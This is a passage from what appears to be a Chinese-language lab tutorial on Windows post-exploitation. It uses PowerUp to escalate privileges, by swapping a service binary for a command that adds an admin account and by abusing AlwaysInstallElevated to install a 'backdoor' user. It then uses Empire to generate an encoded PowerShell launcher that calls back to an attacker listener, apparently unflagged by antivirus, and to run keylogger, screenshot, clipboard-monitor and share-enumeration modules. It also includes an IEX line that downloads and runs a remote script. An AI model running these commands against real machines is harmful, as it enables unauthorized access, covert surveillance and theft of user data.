</span></span><span class="line"><span class="cl">    <span class="p">+</span> <span class="n">FullyQualifiedErrorId</span> <span class="err">:</span> <span class="n">CopyFileInfoItemUnauthorizedAccessError</span><span class="p">,</span><span class="n">Microsoft</span><span class="p">.</span><span class="py">PowerShell</span><span class="p">.</span><span class="py">Commands</span><span class="p">.</span><span class="py">CopyItemCommand</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">警告</span><span class="err">:</span> <span class="n">Error</span> <span class="n">backing</span> <span class="n">up</span> <span class="s1">&#39;C:\hh.exe&#39;</span> <span class="err">:</span> <span class="n">对路径</span><span class="err">“</span><span class="n">C:</span><span class="p">\</span><span class="n">hh</span><span class="p">.</span><span class="py">exe</span><span class="p">.</span><span class="n">bak</span><span class="err">”</span><span class="n">的访问被拒绝</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ServiceName</span> <span class="n">Path</span>      <span class="n">Command</span>                                                                                  <span class="n">BackupPa</span>
</span></span><span class="line"><span class="cl">                                                                                                               <span class="n">th</span>
</span></span><span class="line"><span class="cl"><span class="p">-----------</span> <span class="p">----</span>      <span class="p">-------</span>                                                                                  <span class="p">--------</span>
</span></span><span class="line"><span class="cl"><span class="n">hh</span>          <span class="n">C:</span><span class="p">\</span><span class="n">hh</span><span class="p">.</span><span class="py">exe</span> <span class="n">net</span> <span class="n">user</span> <span class="n">admin</span> <span class="n">p</span><span class="nv">@ssw0rd</span> <span class="p">/</span><span class="n">add</span> <span class="p">&amp;&amp;</span> <span class="n">timeout</span> <span class="p">/</span><span class="n">t</span> <span class="mf">5</span> <span class="p">&amp;&amp;</span> <span class="n">net</span> <span class="n">localgroup</span> <span class="n">Administrators</span> <span class="n">admin</span> <span class="p">/</span><span class="n">add</span> <span class="n">C:</span><span class="p">\</span><span class="n">hh</span><span class="p">...</span>
</span></span></code></pre></div><p>提示了错误没关系的，主要是没有把备份的文件写入c盘的权限而已，但是我们的恶意程序已经写进去了，然后我们现在重启下电脑：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span> <span class="n">shutdown</span> <span class="n">-r</span> <span class="n">-t</span> <span class="mf">0</span>
</span></span></code></pre></div><blockquote>
<p>如果提示拒绝访问且已经设置了上面的关闭系统权限，注销重新登录即可</p>
</blockquote>
<p>可以看到我们我们的恶意代码已经执行，添加了<code>admin</code>用户，而且是管理员组的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span><span class="n">net</span> <span class="n">user</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">\\</span><span class="nb">WIN-I1OIAEUTNT1</span> <span class="n">的用户帐户</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">admin</span>                    <span class="n">Administrator</span>            <span class="n">DefaultAccount</span>
</span></span><span class="line"><span class="cl"><span class="n">Guest</span>                    <span class="n">test</span>
</span></span><span class="line"><span class="cl"><span class="n">命令成功完成</span><span class="err">。</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span><span class="n">net</span> <span class="n">user</span> <span class="n">admin</span>
</span></span><span class="line"><span class="cl"><span class="n">用户名</span>                 <span class="n">admin</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="n">可允许的登录小时数</span>     <span class="n">All</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">本地组成员</span>             <span class="p">*</span><span class="n">Administrators</span>       <span class="p">*</span><span class="n">Users</span>
</span></span><span class="line"><span class="cl"><span class="n">全局组成员</span>             <span class="p">*</span><span class="n">None</span>
</span></span></code></pre></div><p>恢复原来的文件，这个因为脚本写入恶意程序的时候会备份在本目录下，我们这个实验环境是没有c盘创建新文件的权限的，所以可以提前把文件复制到可读写的文件夹当中，以便后面恢复，powerup脚本有一个回复文件的函数，命令如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span> <span class="nb">Restore-ServiceBinary</span> <span class="n">-ServiceName</span> <span class="s1">&#39;hh&#39;</span>
</span></span></code></pre></div><h3 id="powerup攻击模块实战2">PowerUp攻击模块实战2</h3>
<p>利用AlwaysInstallElevated提权是一个2017年公开的技术，Metasploit和PowerUp都提供了利用方法，在这个实战会用到<code>Get-RegistryAlwaysInstallElevated</code>和<code>Write-UserAddMSI</code>这两个模块。</p>
<p>现在在管理员权限下设置一下漏洞环境,打开运行栏(win+R),输入”gpedit.msc”,即可进入本地组策略编辑器界面，然后路径设置：</p>
<ul>
<li>计算机配置–管理模板–Windows组件–Windows Installer，点击始终以提升的权限进行安装，选择已启用</li>
<li>用户配置–管理模板–Windows组件–Windows Installer，点击始终以提升的权限进行安装，选择已启用</li>
</ul>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//6.png" alt="6"></p>
<p>或者利用命令行对注册表进行操作也可以：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">add</span> <span class="n">HKCU</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="mf">1</span>
</span></span><span class="line"><span class="cl"><span class="n">reg</span> <span class="n">add</span> <span class="n">HKLM</span><span class="p">\</span><span class="n">SOFTWARE</span><span class="p">\</span><span class="n">Policies</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Installer</span> <span class="p">/</span><span class="n">v</span> <span class="n">AlwaysInstallElevated</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="mf">1</span>
</span></span></code></pre></div><blockquote>
<p>1、更改策略使用gpupdate /force 来进行更新策略</p>
<p>2、重新注销普通用户，要不然检测不出来</p>
</blockquote>
<p>登录到普通用户下执行<code>Get-RegistryAlwaysInstallElevated</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span> <span class="nb">IEX </span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="py">DownloadString</span><span class="p">(</span><span class="s2">&#34;http://172.16.0.107:8000/Privesc/PowerUp.ps1&#34;</span><span class="p">);</span> <span class="nb">Get-Reg</span>
</span></span><span class="line"><span class="cl"><span class="n">istryAlwaysInstallElevated</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">True</span>
</span></span></code></pre></div><p>显示为<code>True</code>后表示可以利用该配置缺陷，我们生成msi文件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span> <span class="nb">Write-UserAddMSI</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">OutputPath</span>
</span></span><span class="line"><span class="cl"><span class="p">----------</span>
</span></span><span class="line"><span class="cl"><span class="n">UserAdd</span><span class="p">.</span><span class="py">msi</span>
</span></span></code></pre></div><p>使用<code>msiexec</code>工具运行，运行后会看到一个新用户<code>backdoor</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span><span class="n">msiexec</span> <span class="p">/</span><span class="n">q</span> <span class="p">/</span><span class="n">i</span> <span class="n">UserAdd</span><span class="p">.</span><span class="py">msi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">test</span><span class="p">&gt;</span><span class="n">net</span> <span class="n">user</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">\\</span><span class="nb">WIN-I1OIAEUTNT1</span> <span class="n">的用户帐户</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">-------------------------------------------------------------------------------</span>
</span></span><span class="line"><span class="cl"><span class="n">Administrator</span>            <span class="n">backdoor</span>                 <span class="n">DefaultAccount</span>
</span></span><span class="line"><span class="cl"><span class="n">Guest</span>                    <span class="n">test</span>
</span></span><span class="line"><span class="cl"><span class="n">命令成功完成</span><span class="err">。</span>
</span></span></code></pre></div><blockquote>
<p>1、这里我使用了/q不弹出安装界面，我这里是弹出来了，可能是因为我服务器上面的密码策略，要不然就是直接执行了，这个还没测试</p>
<p>2、如果更改了策略还是无法运行，这里我做了很多测试，最后是因为没有安装.net 3.5组件而导致的</p>
</blockquote>
<h1 id="empire">Empire</h1>
<p>Empire是一款针对Windows平台的、使用Powershell脚本作为攻击载荷的渗透攻击框架工具，具有从stager生成、提权到渗透维持的一系列功能。Empire实现了无需powshell.exe就可运行Powershell代理的功能，还可以快速在后期部署漏洞利用模块，其内置模块有键盘记录、Mimikatz、绕过UAC、内网扫描等，使用能够躲避内网检测喝大部分安全防护工具的查杀，简单来说就有点类似Metasploit，是一个基于PowerShell的远程控制木马。</p>
<p>Empire的全部功能可以参考其官方网站：http://www.powshellempire.com/</p>
<h2 id="安装-1">安装</h2>
<p>书中的GitHub版本已经好几年没更新了，我一直安装不上，其实在新版的kali中已经内置了该工具，如果没有的可以使用下面命令安装：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install powershell-empire
</span></span></code></pre></div><p>Kali 内置的工具：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@kali:~# powershell-empire -h
</span></span><span class="line"><span class="cl">usage: empire.py <span class="o">[</span>-h<span class="o">]</span> <span class="o">{</span>server,client<span class="o">}</span> ...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">positional arguments:
</span></span><span class="line"><span class="cl">  <span class="o">{</span>server,client<span class="o">}</span>
</span></span><span class="line"><span class="cl">    server         Launch Empire Server
</span></span><span class="line"><span class="cl">    client         Launch Empire CLI
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">optional arguments:
</span></span><span class="line"><span class="cl">  -h, --help       show this <span class="nb">help</span> message and <span class="nb">exit</span>
</span></span></code></pre></div><p>也可以使用GitHub进行安装新版的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/BC-SECURITY/Empire.git
</span></span></code></pre></div><p>然后安装Empire的依赖，命令如下:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> setup
</span></span><span class="line"><span class="cl">pip install -r requirements.txt（若没有安装pip库，则需要先通过apt-get install pip进行安装）
</span></span><span class="line"><span class="cl">./install.sh
</span></span></code></pre></div><p>启动的时候要先运行服务器端,这个就有点类似于命令行版本的cs：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo powershell-empire server
</span></span></code></pre></div><p>然后在启动客户端：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo powershell-empire client
</span></span></code></pre></div><p>这个跟网上的那些版本有很大的改变，文章也很少有更新的，主要还是看官网的文档为主：<a href="https://bc-security.gitbook.io/empire-wiki/">empire-wiki</a></p>
<p>书中有很多已经不能在实战中使用了，因为这款工具跟msf差不多，主要是后渗透的。</p>
<h2 id="监听上线">监听上线</h2>
<p>我们先在<code>client</code>端进行命令操作：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire<span class="o">)</span> &gt; <span class="nb">help</span>
</span></span></code></pre></div><p>我们可以看到以下选项：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//7.png" alt="image-20220119125954348"></p>
<p>功能我就不多介绍了，跟cs也差不多，只是命令行模式的而已，我们先来建立一个监听模块，使用<code>uselisteners</code> 按下tab可以看到有很多选项，这里就选择http来作为演示：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//8.png" alt="image-20220119130945523"></p>
<p>进入http的监听模式后可以输入下面的命令进行查看需要设置的选项:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: uselistener/http<span class="o">)</span> &gt; options
</span></span></code></pre></div><p>这里我们设置监听名称、IP（这个是kali的IP，也就是你的empire服务端的IP）、端口就行了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: uselistener/http<span class="o">)</span> &gt; <span class="nb">set</span> Name <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Name to <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: uselistener/http<span class="o">)</span> &gt; <span class="nb">set</span> Host 172.16.0.107
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Host to 172.16.0.107
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: uselistener/http<span class="o">)</span> &gt; <span class="nb">set</span> Port <span class="m">8888</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Port to <span class="m">8888</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: uselistener/http<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listener <span class="nb">test</span> successfully started
</span></span></code></pre></div><p>然后我们输入<code>back</code>就可以返回上一层，输入<code>listeners</code>查看监听的信息：</p>
<table>
<thead>
<tr>
<th>ID</th>
<th>Name</th>
<th>Module</th>
<th>Listener Category</th>
<th>Created At</th>
<th>Enabled</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>test</td>
<td>http</td>
<td>client_server</td>
<td>2022-01-19 13:14:56 CST (3 minutes ago)</td>
<td>True</td>
</tr>
</tbody>
</table>
<p>下一步就是生成木马了，利用的功能是<code>usestager</code>，可以看到我们有很多可以选择，类似msf的payload一样。</p>
<p>书中讲了DLL、VBS等利用方式，其实都跟msf利用差不多，但是有一样是改变了，比如<code>launcher</code>,书中是直接在<code>listeners</code>界面执行<code>launcher powershel test</code>,在新版就没有这个执行方式了，直接就是利用下面的<code>multi/launcher</code>就行了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//9.png" alt="9"></p>
<p>我们只需要进入该模块，然后设置监听的选项就可以了：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: usestager/multi/launcher<span class="o">)</span> &gt; <span class="nb">set</span> Listener <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Listener to <span class="nb">test</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usestager/multi/launcher<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl">powershell -noP -sta -w <span class="m">1</span> -enc  SQBGACgAJABQAFMAVgBlAHIAcwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAFIAcwBJAG8ATgAuAE0AQQBKAG8AcgAgAC0ARwBFACAAMwApAHsAJABSAGUAZgA9AFsAUgBlAEYAXQAuAEEAcwBzAGUATQBCAEwAWQAuAEcARQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALg...
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl"><span class="nv">AEEAVABBAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkAbgBbAEMAaABBAHIAWwBdAF0AKAAmACAAJABSACAAJABEAEEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA</span><span class="o">=</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usestager/multi/launcher<span class="o">)</span> &gt;
</span></span></code></pre></div><p>下面我们把这条powershell的复制到我们的Windows中执行，可以看到火绒没有报毒，执行有一个提醒拦截的提示：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//10.png" alt="10"></p>
<p>回到我们的empire中可以看到已经上线了：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//11.png" alt="11"></p>
<h2 id="连接主机及信息收集">连接主机及信息收集</h2>
<p>我们进入<code>agents</code>模式之后，选择进入其中一台主机进行操作，可以使用shell+基础命令，或者输入<code>help</code>查看可执行的命令，在此就不再多阐述：</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//12.png" alt="12"></p>
<h3 id="屏幕截图">屏幕截图</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/collection/screenshot
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @obscuresec                                                            
</span></span><span class="line"><span class="cl">              @harmj0y                                                               
</span></span><span class="line"><span class="cl"> Background   False                                                                  
</span></span><span class="line"><span class="cl"> Comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
</span></span><span class="line"><span class="cl">              /Get-TimedScreenshot.ps1                                               
</span></span><span class="line"><span class="cl"> Description  Takes a screenshot of the current desktop and returns the output as a  
</span></span><span class="line"><span class="cl">              .PNG.                                                                  
</span></span><span class="line"><span class="cl"> Language     powershell                                                             
</span></span><span class="line"><span class="cl"> Name         powershell/collection/screenshot                                       
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                  
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                                   
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1113                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬──────────┬───────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name  │ Value    │ Required │ Description                       │
</span></span><span class="line"><span class="cl">├───────┼──────────┼──────────┼───────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent │ Y35E4PR8 │ True     │ Agent to run module on.           │
</span></span><span class="line"><span class="cl">├───────┼──────────┼──────────┼───────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Ratio │          │ False    │ JPEG Compression ratio: <span class="m">1</span> to 100. │
</span></span><span class="line"><span class="cl">└───────┴──────────┴──────────┴───────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/collection/screenshot<span class="o">)</span> &gt;
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/collection/screenshot<span class="o">)</span> &gt; execute
</span></span></code></pre></div><h3 id="键盘记录">键盘记录</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/collection/keylogger
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @obscuresec                                                            
</span></span><span class="line"><span class="cl">              @mattifestation                                                        
</span></span><span class="line"><span class="cl">              @harmj0y                                                               
</span></span><span class="line"><span class="cl"> Background   True                                                                   
</span></span><span class="line"><span class="cl"> Comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
</span></span><span class="line"><span class="cl">              /Get-Keystrokes.ps1                                                    
</span></span><span class="line"><span class="cl"> Description  Logs keys pressed, <span class="nb">time</span> and the active window <span class="o">(</span>when changed<span class="o">)</span> to the    
</span></span><span class="line"><span class="cl">              keystrokes.txt file. This file is located in the agents downloads      
</span></span><span class="line"><span class="cl">              directory Empire/downloads/&lt;AgentName&gt;/keystrokes.txt.                 
</span></span><span class="line"><span class="cl"> Language     powershell                                                             
</span></span><span class="line"><span class="cl"> Name         powershell/collection/keylogger                                        
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                  
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                                   
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1056                               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name  │ Value    │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├───────┼──────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent │ Y35E4PR8 │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├───────┼──────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Sleep │ <span class="m">1</span>        │ False    │ Sleep <span class="nb">time</span> <span class="o">[</span>ms<span class="o">]</span> between key         │
</span></span><span class="line"><span class="cl">│       │          │          │ presses. Shorter <span class="nb">times</span> may increase │
</span></span><span class="line"><span class="cl">│       │          │          │ CPU usage on the target.            │
</span></span><span class="line"><span class="cl">└───────┴──────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/collection/keylogger<span class="o">)</span> &gt; execute
</span></span></code></pre></div><h3 id="剪切板记录">剪切板记录</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/collection/clipboard_monitor
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                                              
</span></span><span class="line"><span class="cl"> Background   True                                                                  
</span></span><span class="line"><span class="cl"> Comments     http://brianreiter.org/2010/09/03/copy-and-paste-with-clipboard-from- 
</span></span><span class="line"><span class="cl">              powershell/                                                           
</span></span><span class="line"><span class="cl"> Description  Monitors the clipboard on a specified interval <span class="k">for</span> changes to copied  
</span></span><span class="line"><span class="cl">              text.                                                                 
</span></span><span class="line"><span class="cl"> Language     powershell                                                            
</span></span><span class="line"><span class="cl"> Name         powershell/collection/clipboard_monitor                               
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                                 
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                                  
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1115                              
</span></span><span class="line"><span class="cl">              http://attack.mitre.org/techniques/T1414                              
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">┌Record Options───┬──────────┬──────────┬─────────────────────────────────────┐
</span></span><span class="line"><span class="cl">│ Name            │ Value    │ Required │ Description                         │
</span></span><span class="line"><span class="cl">├─────────────────┼──────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ Agent           │ Y35E4PR8 │ True     │ Agent to run module on.             │
</span></span><span class="line"><span class="cl">├─────────────────┼──────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ CollectionLimit │          │ False    │ Specifies the interval in minutes   │
</span></span><span class="line"><span class="cl">│                 │          │          │ to capture clipboard text. Defaults │
</span></span><span class="line"><span class="cl">│                 │          │          │ to indefinite collection.           │
</span></span><span class="line"><span class="cl">├─────────────────┼──────────┼──────────┼─────────────────────────────────────┤
</span></span><span class="line"><span class="cl">│ PollInterval    │ <span class="m">15</span>       │ True     │ Interval <span class="o">(</span>in seconds<span class="o">)</span> to check the  │
</span></span><span class="line"><span class="cl">│                 │          │          │ clipboard <span class="k">for</span> changes, defaults to  │
</span></span><span class="line"><span class="cl">│                 │          │          │ <span class="m">15</span> seconds.                         │
</span></span><span class="line"><span class="cl">└─────────────────┴──────────┴──────────┴─────────────────────────────────────┘
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/collection/clipboard_monitor<span class="o">)</span> &gt; execute
</span></span></code></pre></div><h3 id="查找共享">查找共享</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/situational_awareness/network/powerview/share_finder
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @harmj0y                                                        
</span></span><span class="line"><span class="cl"> Background   True                                                            
</span></span><span class="line"><span class="cl"> Comments     https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/  
</span></span><span class="line"><span class="cl"> Description  Finds shares on machines in the domain. Part of PowerView.      
</span></span><span class="line"><span class="cl"> Language     powershell                                                      
</span></span><span class="line"><span class="cl"> Name         powershell/situational_awareness/network/powerview/share_finder 
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                           
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                            
</span></span><span class="line"><span class="cl"> Software     http://attack.mitre.org/software/S0194                          
</span></span><span class="line"><span class="cl"> Techniques   http://attack.mitre.org/techniques/T1135 
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="o">(</span>Empire: usemodule/powershell/situational_awareness/network/powerview/share_finder<span class="o">)</span> &gt; execute
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Tasked Y35E4PR8 to run Task <span class="m">9</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">9</span> results received
</span></span><span class="line"><span class="cl">Job started: EZ3W6X
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Task <span class="m">9</span> results received
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Name           Type Remark              ComputerName
</span></span><span class="line"><span class="cl">----           ---- ------              ------------
</span></span><span class="line"><span class="cl">ADMIN$   <span class="m">2147483648</span> 远程管理                DC.hack.lab 
</span></span><span class="line"><span class="cl">C$       <span class="m">2147483648</span> 默认共享                DC.hack.lab 
</span></span><span class="line"><span class="cl">IPC$     <span class="m">2147483651</span> 远程 IPC              DC.hack.lab 
</span></span><span class="line"><span class="cl">NETLOGON          <span class="m">0</span> Logon server share  DC.hack.lab 
</span></span><span class="line"><span class="cl">SYSVOL            <span class="m">0</span> Logon server share  DC.hack.lab 
</span></span></code></pre></div><h3 id="收集目标主机信息">收集目标主机信息</h3>
<p>有时候会有延迟，稍微等一下任务执行完返回就行了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>Empire: Y35E4PR8<span class="o">)</span> &gt; usemodule powershell/situational_awareness/host/winenum
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Set Agent to Y35E4PR8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"> Author       @xorrior                                                        
</span></span><span class="line"><span class="cl"> Background   True                                                            
</span></span><span class="line"><span class="cl"> Comments     https://github.com/xorrior/RandomPS-Scripts/blob/master/Invoke- 
</span></span><span class="line"><span class="cl">              WindowsEnum.ps1                                                 
</span></span><span class="line"><span class="cl"> Description  Collects revelant information about a host and the current user 
</span></span><span class="line"><span class="cl">              context.                                                        
</span></span><span class="line"><span class="cl"> Language     powershell                                                      
</span></span><span class="line"><span class="cl"> Name         powershell/situational_awareness/host/winenum                   
</span></span><span class="line"><span class="cl"> NeedsAdmin   False                                                           
</span></span><span class="line"><span class="cl"> OpsecSafe    True                                                            
